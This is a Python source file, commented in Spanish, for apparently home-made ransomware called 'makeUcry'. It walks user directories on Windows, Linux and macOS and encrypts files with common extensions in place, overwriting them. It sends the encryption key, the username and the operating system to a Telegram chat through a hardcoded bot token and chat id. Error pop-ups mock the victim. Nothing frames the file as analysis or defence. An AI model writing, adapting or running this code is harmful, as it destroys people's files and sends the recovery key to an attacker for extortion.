from cryptography.fernet import Fernet
import os
import platform
import requests
from datetime import datetime
from tkinter import messagebox

user = os.getlogin()
Windows_dir = f'C:\\Users\\User\\OneDrive - INTEC\\Escritorio\\carpeta_totalmente_normal'
Linux_dir = '/home/'
plataforma = platform.system()
llave = Fernet.generate_key()
fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

extensiones = 'rar','php','jpg','png','mp3','mp4','zip','rar','cs','webp','txt','docx','bat','iso','gif','jpeg','psd','pdf','sh','py' 

def dir_finder(dir_inicio):
        for dirpath, dirs, files in os.walk(dir_inicio):

            if("$Recycle.Bin" in dirpath):pass                         # Skip Junks
            elif("c:\\Windows" in dirpath):pass                        # Skip c:\\Windows
            elif("\\AppData\\" in dirpath):pass                        # Skip \AppData\
            elif("System32" in dirpath):pass  
            
            for i in files:
                absolute_dir = os.path.abspath(os.path.join(dirpath, i))
                ext = absolute_dir.split('.')[-1]
                if ext in extensiones:
                    yield absolute_dir


def crypt():   
    #identifica el sistema operativo y asigna el directorio que el corresponde 
    if (plataforma == 'Windows'):
        x = dir_finder(Windows_dir)
    elif (plataforma == 'Linux' or plataforma == 'Darwin'):
        x = dir_finder(Linux_dir)
    else:
        messagebox.showerror(title='Error de compatibilidad',message='Te me salvaste... digo\nTu host no es compatible con este amigable programa')
        exit

    e = Fernet(llave)

    for i in x:
        with open(i, 'rb') as file:
            file_data = file.read()
        crypted = e.encrypt(file_data)
        with open(i, 'wb') as file:
            file.write(crypted) 

def error(): #Mensajes de error con tkinter :D
    if plataforma == 'Linux':
        messagebox.showerror(title='makeUcry_eror',message='Ejecutame otra vez y te exploto el pc... digo, error.\nDebes ejecutar este programa como root')
        exit
    if plataforma == 'Windows':
        messagebox.showerror(title='makeUcry_eror',message='Ejecutame otra vez y te exploto el pc... digo, error.\nDebes tener permisos de administrador para este programa')
        exit
    else:
        messagebox.showerror(title='makeUcry_eror',message='Ejecutame otra vez y te exploto el pc... digo, error.\nDebes tener permisos de administrador para este programa')
        exit

def Key_send():#Envia la llave a un grupo de telegram
    #API DE TELEGRAM CON EL TOKEN DEL BOT --> https://api.telegram.org/bot5060162437:AAFelpBefrX90LAr4n03WX37MVxJs4GAc_w/getupdates#
    
    id = '-779965945' #Id del chat objetivo
    token = "5060162437:AAFelpBefrX90LAr4n03WX37MVxJs4GAc_w" #token del bot
    message  = f'''||||||||||||JACKPOT||||||||||||||\nos ---> {plataforma}|\nUsername ---> {user}|\nPasswd--> {llave}|\n Time ---> {fecha}|'''
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={message}'
    
    requests.post(url) #ejecucion de la peticion http a la api de telegram con una url que bot debe usar
    #a que chat debe enviar el mensaje y contiene el mensaje a enviar

Key_send()

if __name__ == '__main__':
    crypt()



